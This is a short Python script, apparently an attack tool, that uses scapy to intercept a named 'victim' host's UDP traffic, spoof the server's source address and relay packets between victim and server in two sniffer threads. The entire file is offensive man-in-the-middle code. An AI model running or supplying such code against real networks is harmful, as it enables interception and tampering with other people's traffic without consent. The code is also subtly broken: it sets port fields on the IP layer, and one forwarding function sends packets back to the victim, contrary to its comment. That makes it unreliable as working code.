from scapy.all import send, UDP, IP, sniff
import threading

# Configuration
victim_ip = '192.168.1.137'  # Victim's IP address
attacker_ip = '192.168.1.146'  # Attacker's IP address
server_ip = '10.5.6.119'
iface = 'en0'  # Network interface to listen on

def forward_to_destination(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip:
            print(f"Captured UDP packet from victim to here: {packet.summary()}")
            packet.show()
            # Forward the packet to its intended destination
            packet[IP].src = server_ip
            packet[IP].dst = victim_ip
            packet[IP].sport = 5005
            packet[IP].dport = 50617
            del packet[IP].chksum  # Recalculate the checksum
            packet.show()
            send(packet)
            print(f"Forwarded UDP packet from here to server: {packet.summary()}")

def forward_to_victim(packet):
    if packet.haslayer(UDP):
        if packet[IP].dst == attacker_ip:
            print(f"Captured UDP response packet from server to here: {packet.summary()}")
            
            # Modify the packet destination back to the victim
            packet[IP].dst = victim_ip
            del packet[IP].chksum  # Recalculate the checksum
            
            send(packet)
            print(f"Forwarded UDP response packet from here to victim: {packet.summary()}")

def sniff_victim_to_server():
    print("Starting sniffer for victim to server")
    sniff(filter=f"udp and src {victim_ip}", prn=forward_to_destination, iface=iface, store=0)

def sniff_server_to_victim():
    print("Starting sniffer for server to victim")
    sniff(filter=f"udp and dst {attacker_ip}", prn=forward_to_victim, iface=iface, store=0)

# Run sniffers in separate threads to handle bidirectional sniffing
thread_victim_to_server = threading.Thread(target=sniff_victim_to_server)
thread_server_to_victim = threading.Thread(target=sniff_server_to_victim)

thread_victim_to_server.start()
thread_server_to_victim.start()

thread_victim_to_server.join()
thread_server_to_victim.join()
